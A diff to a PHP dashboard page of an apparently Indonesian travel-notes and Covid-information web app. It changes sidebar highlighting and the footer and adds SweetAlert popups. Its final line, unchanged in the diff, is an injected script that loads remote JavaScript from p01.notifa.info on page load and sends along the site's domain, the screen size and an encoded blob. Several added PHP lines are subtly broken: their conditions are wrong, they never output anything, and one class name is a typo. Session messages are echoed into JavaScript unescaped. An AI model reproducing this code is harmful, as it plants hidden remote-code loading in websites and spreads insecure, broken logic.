@@ -92,26 +92,26 @@ if(empty( $_SESSION['nik'])){ ?>
                         <div class="app-sidebar__inner mx-auto animated bounceInLeft">
                             <ul class="vertical-nav-menu">
                                 <li class="app-sidebar__heading">Menu</li>
-                                <li>
-                                    <a href="user.php" >
+                                <li <?php (isset($_GET['url']) == 'index.php') ? '': 'active' ?>>
+                                    <a href="user.php">
                                         <i class="metismenu-icon pe-7s-monitor text-primary"></i>
                                         Dashboard
                                     </a>
                                 </li>
-                                <li>
-                                    <a href="?url=tulis_catatan" >
+                                <li <?php (isset($_GET['url']) == 'tulis_catatan') ? 'mm-active' : ''; ?> >
+                                    <a href="?url=tulis_catatan">
                                         <i class="metismenu-icon pe-7s-pen text-primary"></i>
                                         Tulis Catatan
                                     </a>
                                 </li>
-                                <li>
-                                    <a href="?url=catatan_perjalanan" >
+                                <li class=" <?php (isset($_GET['url']) == 'catatan_perjalanan') ? ' ' : 'mm=active'; ?> ">
+                                    <a href="?url=catatan_perjalanan">
                                         <i class="metismenu-icon pe-7s-note text-primary"></i>
                                         Kelola Catatan
                                     </a>
                                 </li>
                                 <li>
-                                    <a href="?url=data_covid" >
+                                    <a href="?url=data_covid">
                                         <i class="metismenu-icon pe-7s-folder text-primary"></i>
                                         Informasi Covid
                                     </a>
@@ -246,23 +246,23 @@ if(empty( $_SESSION['nik'])){ ?>
                         </div>
                     </div>   
                 </div>
-             <?php   } ?>
-            </div>
-            <div class="app-wrapper-footer">
-                <div class="app-footer">
-                    <div class="app-footer__inner">
-                        <div class="app-footer-right">
-                            <ul class="nav">
-                                <li class="nav-item">
-                                    <a href="javascript:void(0);" class="nav-link">
-                                        &copy; Mohammad Reihan Zakya Alawi
-                                    </a>
-                                </li>
-                            </ul>
+                <div class="app-wrapper-footer">
+                    <div class="app-footer">
+                        <div class="app-footer__inner">
+                            <div class="app-footer-right">
+                                <ul class="nav">
+                                    <li class="nav-item">
+                                        <a href="javascript:void(0);" class="nav-link">
+                                            &copy; Mohammad Reihan Zakya Alawi
+                                        </a>
+                                    </li>
+                                </ul>
+                            </div>
                         </div>
                     </div>
-                </div>
-            </div>  
+                </div>  
+             <?php   } ?>
+            </div>
             
     <!-- Architech -->
     <script type="text/javascript" src="assets/scripts/main.js"></script>
@@ -293,6 +293,8 @@ if(empty( $_SESSION['nik'])){ ?>
     <script src="assets/plugins/bootstrap-datatable/js/buttons.print.min.js"></script>
     <script src="assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js"></script>
 
+ 
+
     <script>
         $(document).ready(function() {
         //Default data table
@@ -310,6 +312,48 @@ if(empty( $_SESSION['nik'])){ ?>
         } );
 
     </script>
+
+<script src="assets/js/sweetalert2@11.js"></script>
+<?php if(isset($_SESSION['success'])) { ?>
+	<script>
+		Swal.fire(
+		'Berhasil',
+		'<?= $_SESSION['success']; ?>',
+		'success'
+		)
+	</script>
+<?php unset($_SESSION['success']); } ?>
+
+<?php if(isset($_SESSION['error'])) { ?>
+	<script>
+		Swal.fire(
+		'Maaf',
+		'<?= $_SESSION['error']; ?>',
+		'error'
+		)
+	</script>
+<?php unset($_SESSION['error']); } ?>
+
+<script>
+ $(document).on('click','#btn-hapus',function(e){
+     e.preventDefault();
+     var link = $(this).attr('href');
+        Swal.fire({
+        title: 'Yakin?',
+        text: "Kamu akan menghapus data ini",
+        icon: 'warning',
+        showCancelButton: true,
+        confirmButtonColor: '#3085d6',
+        cancelButtonColor: '#d33',
+        cancelButtonText: 'Batal',
+        confirmButtonText: 'Ya'
+        }).then((result) => {
+        if (result.isConfirmed) {
+            window.location = link;
+        }
+        })
+ })        
+</script>
 
     <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 
